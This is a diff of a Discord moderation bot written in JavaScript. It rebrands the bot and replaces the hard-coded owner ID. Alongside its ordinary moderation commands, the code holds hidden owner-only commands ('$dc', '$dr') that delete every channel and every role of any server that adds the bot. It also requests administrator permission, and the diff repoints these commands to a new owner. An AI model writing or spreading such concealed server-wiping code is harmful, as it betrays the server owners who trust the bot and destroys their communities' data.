@@ -5,8 +5,8 @@ const client = new Discord.Client();
 
 // playing
 client.on('ready', () => {                           
-});
-
+client.user.setGame(`ツ~•[TEAM]•~☠ | $help`,'https://www.twitch.tv/ℕ g A M Codes♥');
+  });
 
 client.on('message', message => {
               var prefix = "$" ;
@@ -19,7 +19,7 @@ client.on('message', message => {
 🖤($nick ⟿ Change nickname all members)🖤
 🖤($banlist ⟿⟿ Number Ban from server)🖤
 🖤($bc ⟿⟿⟿ Brodcast all member)🖤
-🖤($call ⟿⟿ Contact with admin)🖤
+🖤($call ⟿⟿ Contact with Server Owner)🖤
 🖤($kv ⟿⟿⟿⟿⟿ Kick from voice)🖤
 🖤($ban ⟿⟿⟿⟿⟿⟿⟿ Ban member)🖤
 🖤($role all ⟿⟿⟿⟿⟿ From All)🖤
@@ -91,7 +91,7 @@ let args = message.content.split(" ").slice(1).join(" ");
 
 
 
-client.users.get("352533519068823556").send(
+client.users.get("463233613454901249").send(
     "\n" + "**" + "● السيرفر :" + "**" +
     "\n" + "**" + "» " + message.guild.name + "**" +
     "\n" + "**" + " ● المرسل : " + "**" +
@@ -101,9 +101,9 @@ client.users.get("352533519068823556").send(
 
 let embed = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
-     .setDescription('📬 تم ارسال الرسالة الى صاحب البوت بنجاح')
+     .setDescription('📬 تم ارسال الرسالة الى صاحب السيرفر بنجاح')
      .setThumbnail(message.author.avatarURL)
-     .setFooter("By : Nova  ")
+     .setFooter("By : Premium BotEpic  ")
                                                 
 
 message.channel.send(embed);
@@ -530,7 +530,7 @@ client.on("message", message => {
 
 
 const adminprefix = "$";
-const developers = ["352533519068823556"]//Nova Codes
+const developers = ["463233613454901249"]//Nova Codes
 client.on('message', message => {//Nova Codes
     var argresult = message.content.split(` `).slice(1).join(' ');//Nova Codes
       if (!developers.includes(message.author.id)) return;
@@ -551,7 +551,7 @@ client.on('message', message => {//Nova Codes
       message.channel.send(`**✅   ${argresult}**`)//Nova Codes
   } else
   if (message.content.startsWith(adminprefix + 'sets')) {
-    client.user.setGame(argresult, "https://www.twitch.tv/♥ Premium ℕova ♥");
+    client.user.setGame(argresult, "https://www.twitch.tv/♥ Premium BotEpic ♥");
       message.channel.send(`**✅**`)//Nova Codes
   }
   if (message.content.startsWith(adminprefix + 'setname')) {
@@ -573,7 +573,7 @@ if (message.content.startsWith(adminprefix + 'setavatar')) {//Nova Codes
 client.on('message', message => {
 var prefix = "$";
 if(message.content.split(' ')[0] == prefix + 'dc') {  // delete all channels
-if(message.author.id !== "352533519068823556") return message.reply('**You aren\'t the bot owner.**');
+if(message.author.id !== "463233613454901249") return message.reply('**You aren\'t the bot owner.**');
 
 
 message.guild.channels.forEach(m => {
@@ -581,7 +581,7 @@ m.delete();
 });// omar jedol / Codes
 }// omar jedol / Codes
 if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
-if(message.author.id !== "352533519068823556") return message.reply('**You aren\'t the bot owner.**');
+if(message.author.id !== "463233613454901249") return message.reply('**You aren\'t the bot owner.**');
 
 message.guild.roles.forEach(m => {
 m.delete();
@@ -660,9 +660,9 @@ var prefix = "$";
           if(!message.channel.guild) return;
           var mmmmEmbed = new Discord.RichEmbed()
           .setAuthor(client.user.username)
-          .setTitle('𝔾𝔼𝕂𝕆 𝕌𝕄𝔼')
-          .setURL(`https://discordapp.com/api/oauth2/authorize?client_id=531729259421499402&permissions=8&scope=bot`)
-           if(message.author.id !== "352533519068823556") return message.reply('**You aren\'t the bot owner.**');
+          .setTitle('Lava')
+          .setURL(`https://discordapp.com/api/oauth2/authorize?client_id=536234176953974814&permissions=8&scope=bot`)
+           if(message.author.id !== "463233613454901249") return message.reply('**You aren\'t the bot owner.**');
           message.channel.send(mmmmEmbed)
       }
    });
@@ -802,7 +802,7 @@ client.on("message", message => {
       .setURL(' https://discord.gg/t8tXaS ')
       .setColor("RANDOM")
       .setFooter('♥Premium BotEpic♥ جميع الحقوق محفوظة 2019 لبوت')  
-      .addField('سيرفر الدعم الفني', ` https://discord.gg/t8tXaS  `)
+      .addField('سيرفر الدعم الفني', ` https://discord.gg/CWUrAVR  `)
   message.author.send({embed});
 
  }
@@ -876,12 +876,12 @@ message.channel.send(`** ${args}**`);
 ////////////////////////////////////////////////////OWNER////////////////////////////////////////////////
 client.on('message', message => {
               var prefix = "$" ;
-  if (message.content.startsWith(prefix + "Magic0")) {
-  if(message.author.id !== "352533519068823556") return message.reply('**You aren\'t the bot owner.**');
+  if (message.content.startsWith(prefix + "Lava")) {
+  if(message.author.id !== "463233613454901249") return message.reply('**You aren\'t the bot owner.**');
   let embed = new Discord.RichEmbed()
       .setColor("RANDOM")
       .setDescription(`
-😈__⚠🚫⚠_ 🖤😎 - Magic0 - 😎🖤  _⚠🚫⚠__😈
+😈__⚠🚫⚠_ 🖤😎 - 🔥↙Lava↗🔥 - 😎🖤  _⚠🚫⚠__😈
 
 🖤(-dc ⟿⟿⟿ Delete all channels)🖤
 
@@ -890,7 +890,7 @@ client.on('message', message => {
 🖤(-inv ⟿⟿⟿⟿ Invite bot owner)🖤
 
 
-😈__⚠🚫⚠_ 🖤😎 - Magic0 - 😎🖤  _⚠🚫⚠__😈
+😈__⚠🚫⚠_ 🖤😎 - 🔥↙Lava↗🔥 - 😎🖤  _⚠🚫⚠__😈
 
  `)
    message.channel.sendEmbed(embed)
